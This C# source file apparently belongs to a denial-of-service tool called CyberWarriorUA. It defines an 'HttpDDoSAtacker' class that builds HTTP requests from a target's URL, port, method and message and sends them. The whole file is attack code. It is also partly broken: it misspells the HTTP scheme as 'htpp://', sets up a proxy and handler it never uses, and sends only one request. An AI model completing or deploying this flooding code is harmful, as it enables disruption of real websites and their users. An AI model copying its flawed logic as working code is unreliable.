using System;
using System.Net;
using System.Net.Http;
using System.Threading.Tasks;
using CyberWarriorUA.Models;

namespace CyberWarriorUA.Services
{
    public class HttpDDoSAtacker : DDoSBase
    {
        public HttpDDoSAtacker(AttackModel attackModel) : base(attackModel)
        {
        }

        public override async Task Attack()
        {
            var proxy = new WebProxy()
            {

            };

            var httpClientHandler = new HttpClientHandler
            {
                Proxy = proxy
            };

            var httpClient = new HttpClient();

            var request = new HttpRequestMessage();

            request.Content = new StringContent(AttackModel.Message);
            request.Method = GetMethod();
            request.RequestUri = GetUri();

            var response = await httpClient.SendAsync(request);

            // var uri = new Uri($"{AttackModel.URL}")
        }

        private Uri GetUri()
        {
            var protocol = AttackModel.IsHttps
                               ? "https://"
                               : "htpp://";
            if (!IPAddress.TryParse(AttackModel.URL, out var iPAddress))
            {
                return new Uri($"{protocol}{AttackModel.URL}:{AttackModel.Port}");
            }
            var url = new Uri(AttackModel.URL);
            var baseUrl = url.Host;

            var newUrl = $"{protocol}{AttackModel.URL}:{AttackModel.Port}/{url.PathAndQuery}";
            return new Uri(newUrl);
        }

        private HttpMethod GetMethod()
        {
            return (EHttpMethod)AttackModel.HttpMethod switch
            {
                EHttpMethod.Get => HttpMethod.Get,
                EHttpMethod.Post => HttpMethod.Post,
                EHttpMethod.Put => HttpMethod.Put,
                EHttpMethod.Delete => HttpMethod.Delete,
                EHttpMethod.Patch => new HttpMethod("PATCH"),
                _ => HttpMethod.Get
            };
        }
    }
}
